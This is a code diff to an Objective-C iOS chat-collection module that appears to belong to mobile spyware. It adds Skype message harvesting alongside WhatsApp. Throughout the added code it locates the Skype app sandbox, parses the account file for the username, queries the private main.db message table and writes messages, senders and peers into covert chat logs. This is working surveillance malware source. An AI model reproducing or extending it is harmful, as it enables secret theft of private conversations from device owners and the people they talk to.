@@ -14,9 +14,10 @@
 
 #define USER_APPLICATIONS_PATH @"/private/var/mobile/Applications"
 #define k_i_AgentChatRunLoopMode @"k_i_AgentChatRunLoopMode"
-#define CHAT_TIMEOUT 3
+#define CHAT_TIMEOUT 5
 #define LOG_DELIMITER 0xABADC0DE
 
+// Whatsapp sql positions
 #define ZMEMBERJID_POS    0
 #define ZTEXT_POS         0
 #define ZISFROMME_POS     1
@@ -26,7 +27,122 @@
 #define Z_PK_POS          5
 #define ZCHATSESSION_POS  6
 
+// Skype sql positions
+#define BODY_XML_POS      0
+#define AUTHOR_POS        1
+#define DIALOG_PART_POS   2
+#define ID_POS            3
+
 static BOOL gWahtAppContactGrabbed = NO;
+
+#pragma mark -
+#pragma mark skXmlShared
+#pragma mark -
+
+@interface skXmlShared : NSObject
+{
+  NSString *mRootPathName;
+  NSMutableString *mDefaultUser;
+  BOOL mLibElemReached;
+  BOOL mAccountElemReached;
+  BOOL mDefaultElemReached;
+}
+
+@property (retain,readwrite) NSString *mDefaultUser;
+
+@end
+
+@implementation skXmlShared
+
+@synthesize mDefaultUser;
+
+- (id)initWithPath:(NSString*)aPath
+{
+  self = [super init];
+  
+  if (self != nil)
+  {
+    mRootPathName = [aPath retain];
+    mDefaultUser = nil;
+    mLibElemReached = FALSE;
+    mAccountElemReached = FALSE;
+    mDefaultElemReached = FALSE;
+  }
+  
+  return self;
+}
+
+- (void)dealloc
+{
+  [mRootPathName release];
+  [mDefaultUser release];
+  [super dealloc];
+}
+
+- (BOOL)parse
+{
+  NSString *_strPath = [NSString stringWithFormat:@"file://%@/Library/Application Support/Skype/shared.xml",
+                       mRootPathName];
+  
+  NSString *strPath =  [_strPath stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
+  
+  NSURL *_url = [NSURL URLWithString:strPath];
+  
+  NSXMLParser *parser = [[NSXMLParser alloc] initWithContentsOfURL:_url];
+
+  [parser setDelegate:self];
+  
+  BOOL bRet = [parser parse];
+  
+  [parser release];
+  
+  return bRet;
+}
+
+#pragma mark Delegate calls
+
+- (void)parser:(NSXMLParser *)parser
+didStartElement:(NSString *)elementName
+  namespaceURI:(NSString *)namespaceURI
+ qualifiedName:(NSString *)qName
+    attributes:(NSDictionary *)attributeDict
+{
+  if ([elementName compare: @"Lib"]     == NSOrderedSame)
+    mLibElemReached = TRUE;
+  if ([elementName compare: @"Account"] == NSOrderedSame)
+    mAccountElemReached = TRUE;
+  if ([elementName compare: @"Default"] == NSOrderedSame)
+    mDefaultElemReached = TRUE;
+  
+  if (mDefaultElemReached == TRUE && mAccountElemReached == TRUE && mLibElemReached == TRUE)
+  {
+    mDefaultUser = [[NSMutableString alloc] init];
+  }
+}
+
+- (void)parser:(NSXMLParser *)parser
+ didEndElement:(NSString *)elementName
+  namespaceURI:(NSString *)namespaceURI
+ qualifiedName:(NSString *)qName
+{
+  if ([elementName compare: @"Default"] == NSOrderedSame)
+  {
+    mDefaultElemReached = FALSE;
+  }
+}
+
+- (void)parser:(NSXMLParser *)parser
+foundCharacters:(NSString *)string
+{
+  if (mDefaultElemReached == TRUE && mAccountElemReached == TRUE && mLibElemReached == TRUE)
+    [mDefaultUser appendString:string];
+}
+
+@end
+
+#pragma mark -
+#pragma mark _i_AgentChat
+#pragma mark -
 
 @implementation _i_AgentChat
 
@@ -40,16 +156,122 @@ static BOOL gWahtAppContactGrabbed = NO;
     if (self)
     {
       mLastMsgPK = 0;
+      mLastWAMsgPk = 0;
+      mLastSkMsgPk = 0;
       mAgentID = AGENT_IM;
       mWADbPathName = nil;
       mWAUsername = @"";
+      mSkDbPathName = nil;
+      mSkUsername = @"";
     }
     
     return self;
 }
 
 #pragma mark -
-#pragma mark Support methods
+#pragma mark Skype Support methods
+#pragma mark -
+
+- (NSString*)getSkRootPathName
+{
+  NSString *rootPath = nil;
+  
+  NSArray *usrAppFirstLevelPath =
+  [[NSFileManager defaultManager] contentsOfDirectoryAtPath:USER_APPLICATIONS_PATH
+                                                      error:nil];
+  
+  if (usrAppFirstLevelPath == nil || [self isThreadCancelled] == TRUE)
+    return  rootPath;
+  
+  for (int i=0; i < [usrAppFirstLevelPath count]; i++)
+  {
+    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+    if ([self isThreadCancelled] == TRUE)
+    {
+      [pool release];
+      return  rootPath;
+    }
+    
+    NSString *tmpPath = [NSString stringWithFormat:@"%@/%@/Skype.app",
+                         USER_APPLICATIONS_PATH,
+                         [usrAppFirstLevelPath objectAtIndex:i]];
+    
+    if ([[NSFileManager defaultManager] fileExistsAtPath: tmpPath] == TRUE)
+    {
+      rootPath = [NSString stringWithFormat:@"%@/%@",
+                  USER_APPLICATIONS_PATH,
+                  [usrAppFirstLevelPath objectAtIndex:i]];
+      
+      if ([[NSFileManager defaultManager] fileExistsAtPath: rootPath] == FALSE)
+      {
+        //[rootPath release];
+        rootPath = nil;
+      }
+      else
+      {
+        [rootPath retain];
+        [pool release];
+        break;
+      }
+    }
+    
+    [pool release];
+  }
+  
+  return rootPath;
+}
+
+- (void)setSkUserName
+{
+  if ([self isThreadCancelled] == TRUE)
+    return;
+  
+  skXmlShared *skShared = [[skXmlShared alloc] initWithPath: [self getSkRootPathName]];
+  
+  [skShared parse];
+  
+  if ([skShared mDefaultUser] != nil)
+    mSkUsername = [[skShared mDefaultUser] retain];
+  
+  [skShared release];
+}
+
+- (BOOL)setSkDbPathName
+{
+  BOOL bRet = FALSE;
+  
+  if ([self isThreadCancelled] == TRUE)
+    return  FALSE;
+  
+  if (mSkDbPathName != nil)
+    return TRUE;
+  
+  NSString *rootPath = [self getSkRootPathName];
+  
+  [self setSkUserName];
+  
+  if (rootPath != nil && mSkUsername != nil)
+  {
+    mSkDbPathName = [[NSString alloc] initWithFormat:@"%@/Library/Application Support/Skype/%@/main.db",
+                     rootPath,
+                     mSkUsername];
+    
+    [rootPath release];
+    
+    if ([[NSFileManager defaultManager] fileExistsAtPath: mSkDbPathName] == TRUE)
+      bRet = TRUE;
+    else
+    {
+      [mSkDbPathName release];
+      mSkDbPathName = nil;
+    }
+  }
+  
+  return bRet;
+}
+#pragma mark -
+#pragma mark WhatsApp Support methods
 #pragma mark -
 
 - (void)getProperties
@@ -62,12 +284,18 @@ static BOOL gWahtAppContactGrabbed = NO;
   
   if (tmpDict != nil)
   {
-    NSNumber *tmplaskpk = [tmpDict objectForKey: @"lastpk"];
+    NSNumber *tmplaskpk =   [tmpDict objectForKey: @"lastpk"];
+    NSNumber *tmpWALastPK = [tmpDict objectForKey: @"WAlastpk"];
+    NSNumber *tmpSkLastPK = [tmpDict objectForKey: @"Sklastpk"];
     
     if (tmplaskpk != nil)
-    {
       mLastMsgPK = [tmplaskpk intValue];
-    }
+    
+    if (tmpWALastPK != nil)
+      mLastWAMsgPk = [tmpWALastPK intValue];
+    
+    if (tmpSkLastPK != nil)
+      mLastSkMsgPk = [tmpSkLastPK intValue];
   }
   
   [pool release];
@@ -76,10 +304,13 @@ static BOOL gWahtAppContactGrabbed = NO;
 - (void)setProperties
 {
   NSNumber *tmpLastPK = [NSNumber numberWithInt: mLastMsgPK];
+  NSNumber *tmpWALastPK = [NSNumber numberWithInt: mLastWAMsgPk];
+  NSNumber *tmpSkLastPK = [NSNumber numberWithInt: mLastSkMsgPk];
   NSString *chatClassKey = [[self class] description];
   
-  NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys: tmpLastPK, @"lastpk", nil];
-//  NSDictionary *dict    = [NSDictionary dictionaryWithObjectsAndKeys: tmpDict, chatClassKey, nil];
+  NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:tmpLastPK, @"lastpk",
+                                                                     tmpWALastPK, @"WAlastpk",
+                                                                     tmpSkLastPK, @"Sklastpk",nil];
   
   [[_i_Utils sharedInstance] setPropertyWithName: chatClassKey withDictionary: tmpDict];
 }
@@ -292,7 +523,99 @@ static BOOL gWahtAppContactGrabbed = NO;
 }
 
 #pragma mark -
-#pragma mark SQLITE3 stuff
+#pragma mark Skype SQLITE3 stuff
+#pragma mark -
+
+- (void)closeSkChatDB:(sqlite3*)db
+{
+  if (db != NULL)
+    sqlite3_close(db);
+}
+
+- (sqlite3*)openSkChatDB
+{
+  sqlite3 *db = NULL;
+  
+  if ([self isThreadCancelled] == TRUE || mSkUsername == nil || mSkDbPathName == nil)
+  {
+    return db;
+  }
+  
+  sqlite3_open([mSkDbPathName UTF8String], &db) ;
+  
+  return db;
+}
+
+- (NSString*)getSqlString:(sqlite3_stmt*)compiledStatement
+                   colNum:(int)column
+{
+  NSString *sqlStr = nil;
+  
+  char *tmpString = (char*)sqlite3_column_text(compiledStatement, column);
+  
+  if (tmpString != NULL)
+    sqlStr =[NSString stringWithUTF8String:tmpString];
+  
+  return sqlStr;
+}
+
+- (NSMutableArray*)getSkChatMessagesFormDB:(sqlite3*)theDB
+                                  withDate:(int)theDate
+{
+  NSMutableArray *retArray = [NSMutableArray arrayWithCapacity:0];
+  char wa_msg_query[256];
+  sqlite3_stmt *compiledStatement;
+  NSNumber *type = [NSNumber numberWithInt:0x00000001];
+  NSNumber *flags = nil;
+  
+  char _wa_msg_query[] =
+  "select body_xml, author, dialog_partner, id from Messages where id >";
+  
+  sprintf(wa_msg_query, "%s %d", _wa_msg_query, theDate);
+  
+  if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
+  {
+    while(sqlite3_step(compiledStatement) == SQLITE_ROW)
+    {
+      int pk = sqlite3_column_int(compiledStatement, ID_POS);
+      
+      if (pk > mLastSkMsgPk)
+      {
+        mLastSkMsgPk = pk;
+        
+        NSString *text = [self getSqlString:compiledStatement colNum:BODY_XML_POS];
+        
+        if (text != nil)
+        {
+          NSString *sndr = [self getSqlString:compiledStatement colNum:AUTHOR_POS];
+          
+          NSString *peer = [self getSqlString:compiledStatement colNum:DIALOG_PART_POS];
+          
+          if ([sndr compare:mSkUsername] == NSOrderedSame)
+            flags = [NSNumber numberWithInt:0x00000001];
+          else
+            flags = [NSNumber numberWithInt:0x00000000];
+    
+          NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:text, @"text",
+                                                                             peer != nil ? peer : mSkUsername, @"peers",
+                                                                             sndr != nil ? sndr : @" ", @"sender",
+                                                                             type,  @"type",
+                                                                             flags, @"flags", nil];
+          
+          [retArray addObject: tmpDict];
+          
+        }
+      }
+    }
+    
+    sqlite3_finalize(compiledStatement);
+  }
+  
+  return retArray;
+}
+
+#pragma mark -
+#pragma mark WhatsApp SQLITE3 stuff
 #pragma mark -
 
 - (void)closeWAChatDB:(sqlite3*)db
@@ -307,7 +630,6 @@ static BOOL gWahtAppContactGrabbed = NO;
   
   if ([self isThreadCancelled] == TRUE || mWADbPathName == nil)
   {
-    [self setMAgentStatus:AGENT_STATUS_STOPPED];
     return db;
   }
   
@@ -543,6 +865,8 @@ static BOOL gWahtAppContactGrabbed = NO;
   NSMutableArray *retArray = [NSMutableArray arrayWithCapacity:0];
   char wa_msg_query[256];
   sqlite3_stmt *compiledStatement;
+  NSNumber *type = [NSNumber numberWithInt:0x00000006];
+  NSNumber *flags = nil;
   
   char _wa_msg_query[] =
     "select ZTEXT, ZISFROMME, ZGROUPMEMBER, ZFROMJID, ZTOJID, Z_PK, ZCHATSESSION from ZWAMESSAGE where ZMESSAGEDATE >";
@@ -555,9 +879,9 @@ static BOOL gWahtAppContactGrabbed = NO;
     {
       int z_pk = sqlite3_column_int(compiledStatement, Z_PK_POS);
        
-      if (z_pk > mLastMsgPK)
+      if (z_pk > mLastWAMsgPk)
       {
-        mLastMsgPK = z_pk;
+        mLastWAMsgPk = z_pk;
         
         NSString *text = [self getText:compiledStatement fromDB:theDB];
         
@@ -566,9 +890,16 @@ static BOOL gWahtAppContactGrabbed = NO;
           NSString *sndr = [self getFromJID:compiledStatement fromDB: theDB];
           NSString *peer = [self getToJID:compiledStatement fromDB:theDB excluding:sndr];
           
-          NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:text, @"text",
-                                                                             peer, @"peers",
-                                                                             sndr, @"sender", nil];
+          if ([sndr compare:mWAUsername] == NSOrderedSame)
+            flags = [NSNumber numberWithInt:0x00000001];
+          else
+            flags = [NSNumber numberWithInt:0x00000000];
+          
+          NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:text,  @"text",
+                                                                             peer,  @"peers",
+                                                                             sndr,  @"sender",
+                                                                             type,  @"type",
+                                                                             flags, @"flags",nil];
           
           [retArray addObject: tmpDict];
       
@@ -583,7 +914,7 @@ static BOOL gWahtAppContactGrabbed = NO;
 }
 
 #pragma mark -
-#pragma mark Agent chat methods
+#pragma mark Chat logging
 #pragma mark -
 
 /* old char version* - begin */
@@ -653,16 +984,18 @@ static BOOL gWahtAppContactGrabbed = NO;
 }
 /* old char version* - end */
 
-- (NSMutableData*)createNewWAChatLog:(NSString*)_sender
-                           withPeers:(NSString*)_peers
-                             andText:(NSString*)_text
+- (NSMutableData*)createNewChatLog:(NSString*)_sender
+                         withPeers:(NSString*)_peers
+                              text:(NSString*)_text
+                              type:(NSNumber*)theType
+                          andFlags:(NSNumber*)theFlags
 {
   // Delimiter
   unsigned int del = LOG_DELIMITER;
   short unicodeNullTerminator = 0x0000;
   time_t rawtime;
   struct tm *tmTemp;
-  int32_t programType = 0x00000006; // WhatsApp
+  int32_t programType = [theType intValue];
   int32_t flags = 0x00000000;
 
   NSData *peers               = [_peers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
@@ -690,10 +1023,7 @@ static BOOL gWahtAppContactGrabbed = NO;
                     length: sizeof (struct tm) - 0x14];
   }
 
-  if (_sender == mWAUsername)
-    flags = 0x00000000;
-  else
-    flags = 0x00000001;
+  flags = [theFlags intValue];
   
   // Program
   [entryData appendBytes: &programType length:sizeof(programType)];
@@ -733,7 +1063,7 @@ static BOOL gWahtAppContactGrabbed = NO;
   return entryData;
 }
 
-- (void)writeWAChatLogs:(NSArray*)chatArray
+- (void)writeChatLogs:(NSArray*)chatArray
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
@@ -760,9 +1090,12 @@ static BOOL gWahtAppContactGrabbed = NO;
     
     NSDictionary* tmpChat = [chatArray objectAtIndex:i];
     
-    NSMutableData *tmpData = [self createNewWAChatLog:[tmpChat objectForKey:@"sender"]
-                                            withPeers:[tmpChat objectForKey:@"peers"]
-                                              andText:[tmpChat objectForKey:@"text"]];
+    NSMutableData *tmpData = [self createNewChatLog:[tmpChat objectForKey:@"sender"]
+                                          withPeers:[tmpChat objectForKey:@"peers"]
+                                               text:[tmpChat objectForKey:@"text"]
+                                               type:[tmpChat objectForKey:@"type"]
+                                           andFlags:[tmpChat objectForKey:@"flags"]];
+    
     [logManager writeDataToLog: tmpData
                       forAgent: LOG_CHAT_NEW
                      withLogID: 0];
@@ -778,6 +1111,10 @@ static BOOL gWahtAppContactGrabbed = NO;
   [pool release];
 }
 
+#pragma mark -
+#pragma mark Whatsapp chat
+#pragma mark -
+
 - (NSMutableArray*)getWAChats
 {
   sqlite3 *db;
@@ -785,7 +1122,6 @@ static BOOL gWahtAppContactGrabbed = NO;
   
   if ([self isThreadCancelled] == TRUE)
   {
-    [self setMAgentStatus:AGENT_STATUS_STOPPED];
     return chatArray;
   }
   
@@ -794,17 +1130,51 @@ static BOOL gWahtAppContactGrabbed = NO;
     sqlite3_close(db);
     return chatArray;
   }
-  chatArray = [self getWAChatMessagesFormDB: db withDate:0.0];
+  
+  chatArray = [self getWAChatMessagesFormDB: db withDate:mLastWAMsgPk];
   
   [self closeWAChatDB: db];
   
   return chatArray;
 }
 
+#pragma mark -
+#pragma mark Skype chat
+#pragma mark -
+
+- (NSMutableArray*)getSkChats
+{
+  sqlite3 *db;
+  NSMutableArray *chatArray = nil;
+  
+  if ([self isThreadCancelled] == TRUE)
+  {
+    return chatArray;
+  }
+  
+  if ((db = [self openSkChatDB]) == NULL)
+  {
+    sqlite3_close(db);
+    return chatArray;
+  }
+  
+  chatArray = [self getSkChatMessagesFormDB:db withDate:mLastSkMsgPk];
+  
+  [self closeSkChatDB: db];
+  
+  return chatArray;
+}
+
+#pragma mark -
+#pragma mark Chats polling routine
+#pragma mark -
+
 - (void)getChat
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
   NSMutableArray *waChats = nil;
+  NSMutableArray *skChats = nil;
   
   if ([self isThreadCancelled] == TRUE)
   {
@@ -813,9 +1183,13 @@ static BOOL gWahtAppContactGrabbed = NO;
     return;
   }
     
+  skChats = [self getSkChats];
+  
   waChats = [self getWAChats];
 
-  [self writeWAChatLogs: waChats];
+  [self writeChatLogs: waChats];
+
+  [self writeChatLogs:skChats];
   
   [pool release];
 }
@@ -839,7 +1213,8 @@ static BOOL gWahtAppContactGrabbed = NO;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  if ([self isThreadCancelled] == TRUE || [self setWADbPathName] == FALSE)
+  if ([self isThreadCancelled] == TRUE ||
+      ([self setWADbPathName] == FALSE && [self setSkDbPathName] == FALSE))
   {
     [self setMAgentStatus:AGENT_STATUS_STOPPED];
     [outerPool release];
@@ -880,108 +1255,3 @@ static BOOL gWahtAppContactGrabbed = NO;
   return YES;
 }
 @end
-
-
-/*- (NSString*)getSender:(sqlite3_stmt*)compiledStatement
- {
- NSString *sqlString = nil;
- 
- if (sqlite3_column_text(compiledStatement, 1) == NULL)
- {
- sqlString = mWAUsername;
- }
- else
- {
- sqlString = [self getSqlLiteString:compiledStatement colNum:1];
- }
- 
- return [self getWAPhoneNumber: sqlString];
- }
- 
- - (NSString*)getPeer:(sqlite3_stmt*)compiledStatement
- {
- NSString *sqlString = nil;
- 
- const unsigned char *tmpPeer = sqlite3_column_text(compiledStatement, 2);
- 
- if ( tmpPeer == NULL)
- {
- sqlString = mWAUsername;
- }
- else
- {
- sqlString = [self getSqlLiteString:compiledStatement colNum:2];
- if (sqlString == nil)
- sqlString = @" ";
- }
- 
- return [self getWAPhoneNumber: sqlString];
- }
- 
- - (NSString*)getPeerFromGroup:(int)theGroup andDB:(sqlite3*)theDB
- {
- NSString *sqlStr = [NSString stringWithUTF8String:" "];
- char wa_msg_query[256];
- 
- char _wa_msg_query[] = "select ZMEMBERJID from ZWAGROUPMEMBER where Z_PK =";
- sprintf(wa_msg_query, "%s %d", _wa_msg_query, theGroup);
- 
- sqlite3_stmt *compiledStatement;
- 
- if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
- {
- if (sqlite3_step(compiledStatement) == SQLITE_ROW)
- {
- const unsigned char *tmpPeer = sqlite3_column_text(compiledStatement, 0);
- sqlStr =[NSString stringWithUTF8String:(char *)tmpPeer];
- }
- }
- 
- sqlite3_finalize(compiledStatement);
- 
- return sqlStr;
- }
- 
- - (NSMutableArray*)getWAChatMessagesFormDB:(sqlite3*)theDB
- withDate:(int)theDate
- {
- NSMutableArray *retArray = [NSMutableArray arrayWithCapacity:0];
- 
- char _wa_msg_query[] = "select ZTEXT, ZGROUPMEMBER, ZFROMJID, ZTOJID, Z_PK from ZWAMESSAGE where ZMESSAGEDATE >";
- char wa_msg_query[256];
- sprintf(wa_msg_query, "%s %d", _wa_msg_query, theDate);
- sqlite3_stmt *compiledStatement;
- 
- if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
- {
- while(sqlite3_step(compiledStatement) == SQLITE_ROW)
- {
- int z_pk     = sqlite3_column_int(compiledStatement, 3);
- int z_grpmem = sqlite3_column_int(compiledStatement, 1);
- 
- 
- if (z_pk > mLastMsgPK)
- {
- mLastMsgPK = z_pk;
- NSString *text = [self getSqlLiteString:compiledStatement colNum:0];
- NSString *peer = [self getPeer:compiledStatement];
- NSString *sndr = [self getSender:compiledStatement];
- 
- if (z_grpmem != SQLITE_NULL)
- {
- 
- }
- 
- NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:text, @"text",
- peer, @"peers",
- sndr, @"sender", nil];
- 
- [retArray addObject: tmpDict];
- }
- }
- 
- sqlite3_finalize(compiledStatement);
- }
- 
- return retArray;
- }*/
